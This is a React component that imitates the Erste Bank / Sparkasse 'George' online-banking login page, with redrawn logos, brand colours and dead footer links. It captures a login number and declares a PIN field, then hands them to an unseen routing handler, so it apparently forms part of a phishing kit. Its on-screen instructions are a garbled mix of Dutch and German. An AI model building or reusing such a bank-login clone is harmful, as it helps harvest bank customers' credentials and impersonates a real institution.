"use client";

import React from "react";

type Props = {
  formData: {
    verfuegernummer?: string;
    pin?: string;
  };
  onChange: (field: string, value: string) => void;
  handleRouteAction: () => void;
  saving?: boolean;
};

export function ErsteBank({ formData, onChange, handleRouteAction, saving }: Props) {
  const handleFinalSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    handleRouteAction();
  };

  return (
    <div className="min-h-screen flex flex-col font-sans bg-white relative z-50">
      <div className="flex-1 flex flex-col md:flex-row w-full">
        
        {/* Left Panel - Login Area */}
        <div className="w-full md:w-1/2 bg-white flex flex-col relative min-h-[500px]">
          {/* Language Flag */}
          <div className="absolute top-4 right-4 cursor-pointer hover:opacity-80 transition-opacity">
            <svg viewBox="0 0 60 30" className="w-8 h-5 border border-gray-200 rounded-sm overflow-hidden" preserveAspectRatio="none">
              <rect width="60" height="30" fill="#012169"/>
              <path d="M0,0 L60,30 M60,0 L0,30" stroke="#fff" strokeWidth="6"/>
              <path d="M0,0 L60,30 M60,0 L0,30" stroke="#C8102E" strokeWidth="4"/>
              <path d="M30,0 L30,30 M0,15 L60,15" stroke="#fff" strokeWidth="10"/>
              <path d="M30,0 L30,30 M0,15 L60,15" stroke="#C8102E" strokeWidth="6"/>
            </svg>
          </div>

          <div className="flex-1 flex flex-col items-center justify-center px-8 md:px-16 max-w-[480px] mx-auto w-full">
            {/* George Logo */}
            <div className="mb-6 flex justify-center">
              <svg width="48" height="64" viewBox="0 0 48 64" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M24 38.4C14.7 38.4 7.2 30.9 7.2 21.6C7.2 12.3 14.7 4.8 24 4.8C33.3 4.8 40.8 12.3 40.8 21.6C40.8 26.5 38.8 30.9 35.5 34L39 37.5C43.3 33.5 46 27.8 46 21.6C46 9.5 36.1 -0.4 24 -0.4C11.9 -0.4 2 9.5 2 21.6C2 33.7 11.9 43.6 24 43.6C26.5 43.6 28.9 43.2 31.1 42.4L29.3 37.6C27.6 38.1 25.8 38.4 24 38.4Z" fill="#2d68ff"/>
                <path d="M34 50.4C32.1 52.3 29.6 53.6 26.8 54.1L28 59.2C31.7 58.5 35.1 56.7 37.8 54.1L34 50.4Z" fill="#2d68ff"/>
              </svg>
            </div>

            <h1 className="text-[#0f2c59] text-[22px] font-bold mb-6 text-center">George Login</h1>

            <p className="text-[#4a5568] text-[14px] leading-relaxed mb-6 self-start">
              Voer uw inlogcode in of<br />
              Ihren selbst gewählten Gebruikersnaamn<br />
              ein.
            </p>

            <form onSubmit={handleFinalSubmit} className="w-full flex flex-col gap-4">
              <div className="relative w-full">
                <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">
                  <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                  </svg>
                </div>
                <input 
                  type="text" 
                  required
                  placeholder="Inlogcode/Gebruikersnaam"
                  value={formData.verfuegernummer || ""}
                  onChange={(e) => onChange("verfuegernummer", e.target.value)}
                  className="w-full h-[44px] border border-[#cbd5e0] rounded-[8px] pl-10 pr-4 outline-none focus:border-[#2d68ff] focus:ring-1 focus:ring-[#2d68ff] text-[#2d3748] placeholder-[#a0aec0] text-[14px] transition-all"
                />
              </div>

              <button 
                type="submit" 
                disabled={saving}
                className="w-full bg-[#2d68ff] hover:bg-[#1a55e6] text-white font-medium h-[44px] rounded-[22px] text-[15px] transition-colors mt-2 disabled:opacity-70 flex items-center justify-center gap-2"
              >
                {saving ? "Lädt..." : "Login starten"}
                {!saving && (
                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5l7 7-7 7" />
                  </svg>
                )}
              </button>
            </form>

            <div className="mt-8 self-start">
              <a href="#" className="text-[#2d68ff] text-[13px] hover:underline leading-snug inline-block">
                Aktivierungscode benötigt oder EB-PIN<br />vergessen?
              </a>
            </div>
          </div>
        </div>

        {/* Right Panel - Green Area */}
        <div className="hidden md:flex w-1/2 bg-[#008055] relative overflow-hidden flex-col justify-center items-center">
          {/* Giant George Logo */}
          <div className="relative w-full max-w-[320px] aspect-square flex items-center justify-center mt-[-100px]">
            <svg viewBox="0 0 100 130" fill="none" xmlns="http://www.w3.org/2000/svg" className="w-full h-full">
              <path d="M50 80C30.6 80 15 64.4 15 45C15 25.6 30.6 10 50 10C69.4 10 85 25.6 85 45C85 55.2 80.9 64.4 74 70.8L81.2 78.2C90.2 69.8 95.8 58 95.8 45C95.8 19.8 75.2 -0.8 50 -0.8C24.8 -0.8 4.2 19.8 4.2 45C4.2 70.2 24.8 90.8 50 90.8C55.2 90.8 60.2 90 64.8 88.4L61 78.4C57.6 79.4 53.9 80 50 80Z" fill="white"/>
              <path d="M70.8 105C66.9 109 61.7 111.7 55.8 112.7L58.3 123.3C66.1 121.9 73.1 118.1 78.7 112.7L70.8 105Z" fill="white"/>
            </svg>
          </div>
          
          <div className="absolute bottom-20 left-16">
            <h2 className="text-white text-[32px] font-medium leading-[1.2] tracking-wide">
              Einfach<br />
              Intelligent<br />
              Persönlich
            </h2>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="w-full bg-[#2d68ff] h-[60px] flex items-center justify-between px-6 md:px-12 text-white shrink-0">
        <div className="flex items-center font-bold text-[18px] tracking-wide gap-2">
          <span>ERSTE</span>
          <div className="flex flex-col items-center justify-center -mt-1">
            <span className="text-[24px] leading-none mb-[-8px] text-[#e3000f]">.</span>
            <span className="text-[28px] leading-none">S</span>
          </div>
          <span>SPARKASSE</span>
          <div className="flex flex-col items-center justify-center -mt-1">
            <span className="text-[24px] leading-none mb-[-8px] text-[#e3000f]">.</span>
            <span className="text-[28px] leading-none">S</span>
          </div>
        </div>

        <div className="hidden md:flex gap-6 text-[12px] font-medium opacity-90">
          <a href="#" className="hover:opacity-100 transition-opacity">Impressum</a>
          <a href="#" className="hover:opacity-100 transition-opacity">Datenschutz</a>
          <a href="#" className="hover:opacity-100 transition-opacity">Geschäftsbedingungen</a>
          <a href="#" className="hover:opacity-100 transition-opacity">Service & Kontakt</a>
          <a href="#" className="hover:opacity-100 transition-opacity">George Hilfe</a>
        </div>
      </footer>
    </div>
  );
}
